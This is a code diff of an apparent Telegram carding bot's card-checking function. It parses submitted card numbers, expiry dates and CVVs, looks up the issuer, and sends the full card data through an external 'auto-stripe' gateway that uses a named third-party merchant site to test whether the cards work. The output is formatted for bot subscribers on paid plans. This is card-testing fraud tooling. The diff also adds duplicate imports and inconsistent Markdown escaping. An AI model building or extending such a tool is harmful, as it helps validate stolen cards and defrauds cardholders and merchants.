@@ -1430,36 +1430,52 @@ async def get_bin_details(bin_number: str) -> dict:
 import aiohttp
 from telegram.constants import ParseMode
 
+import aiohttp
+from telegram.constants import ParseMode
+
 async def background_check(cc_raw, user, user_data, processing_msg):
-    bullet_text = escape_markdown_v2("[⌇]")
+    from telegram.helpers import escape_markdown
+    bullet_text = escape_markdown("[⌇]")
     bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"
 
     try:
-        # --- Normalize separators ---
+        # --- Normalize card input ---
         cc_normalized = cc_raw.replace("/", "|").replace("\\", "|")
-        # Remove extra whitespace
-        cc_normalized = "|".join(p.strip() for p in cc_normalized.split("|"))
         parts = cc_normalized.split("|")
 
         if len(parts) != 4:
             await processing_msg.edit_text(
                 "❌ Invalid format. Use like:\n"
                 "`1234567812345678|12|2028|123`\n"
-                "Separators | / \\ are all supported.",
+                "You can also use `/` or `\\` instead of `|`.",
                 parse_mode=ParseMode.MARKDOWN_V2
             )
             return
 
-        cc, mm, yy, cvv = parts
+        number, mm, yy, cvv = parts
 
-        # --- Handle 2-digit year ---
+        # --- Validate month ---
+        if not mm.isdigit() or not (1 <= int(mm) <= 12):
+            await processing_msg.edit_text(
+                "❌ Invalid month. Use 01-12.",
+                parse_mode=ParseMode.MARKDOWN_V2
+            )
+            return
+
+        # --- Validate year ---
         if len(yy) == 2:
-            yy = "20" + yy  # converts 30 -> 2030
-
-        cc_normalized = f"{cc}|{mm}|{yy}|{cvv}"
+            yy = "20" + yy
+        elif len(yy) == 4:
+            pass
+        else:
+            await processing_msg.edit_text(
+                "❌ Invalid year format. Use 2-digit or 4-digit year, e.g., 30 or 2030.",
+                parse_mode=ParseMode.MARKDOWN_V2
+            )
+            return
 
         # --- BIN lookup ---
-        bin_number = cc[:6]
+        bin_number = number[:6]
         bin_details = await get_bin_details(bin_number)
 
         brand = (bin_details.get("scheme") or "N/A").upper()
@@ -1472,7 +1488,7 @@ async def background_check(cc_raw, user, user_data, processing_msg):
             f"https://darkboy-auto-stripe-y6qk.onrender.com/"
             f"gateway=autostripe/key=darkboy/"
             f"site=buildersdiscountwarehouse.com.au/"
-            f"cc={cc_normalized}"
+            f"cc={number}|{mm}|{yy}|{cvv}"
         )
 
         async with aiohttp.ClientSession() as session:
@@ -1510,21 +1526,21 @@ async def background_check(cc_raw, user, user_data, processing_msg):
         else:
             status_text = api_status.upper()
 
-        # --- Prepare final message ---
-        header = f"═══\\[ **{escape_markdown_v2(status_text)}** \\]═══"
-        formatted_response = f"_{escape_markdown_v2(api_status)}_"
+        header = f"═══\\[ **{escape_markdown(status_text)}** \\]═══"
+        formatted_response = f"_{escape_markdown(api_status)}_"
 
+        # --- Build final message ---
         final_text = (
             f"{header}\n"
-            f"{bullet_link} 𝐂𝐚𝐫𝐝 ➜ `{escape_markdown_v2(cc_normalized)}`\n"
+            f"{bullet_link} 𝐂𝐚𝐫𝐝 ➜ `{escape_markdown(cc_normalized)}`\n"
             f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 𝑨𝒖𝒕𝒉\n"
             f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {formatted_response}\n"
             f"――――――――――――――――\n"
-            f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➜ {escape_markdown_v2(brand)}\n"
-            f"{bullet_link} 𝐁𝐚𝐧𝐤 ➜ {escape_markdown_v2(issuer)}\n"
-            f"{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {escape_markdown_v2(country_name)} {country_flag}\n"
+            f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➜ {escape_markdown(brand)}\n"
+            f"{bullet_link} 𝐁𝐚𝐧𝐤 ➜ {escape_markdown(issuer)}\n"
+            f"{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {escape_markdown(country_name)} {country_flag}\n"
             f"――――――――――――――――\n"
-            f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ {escape_markdown_v2(user.first_name)}\\[{escape_markdown_v2(user_data.get('plan', 'Free'))}\\]\n"
+            f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ {escape_markdown(user.first_name)}\\[{escape_markdown(user_data.get('plan', 'Free'))}\\]\n"
             f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➜ [kคli liຖนxx](tg://resolve?domain=Deadkiller72)\n"
             f"――――――――――――――――"
         )
@@ -1537,9 +1553,10 @@ async def background_check(cc_raw, user, user_data, processing_msg):
 
     except Exception as e:
         await processing_msg.edit_text(
-            f"❌ An error occurred: {escape_markdown_v2(str(e))}",
+            f"❌ An error occurred: {escape_markdown(str(e))}",
             parse_mode=ParseMode.MARKDOWN_V2
         )
+
 
 
         
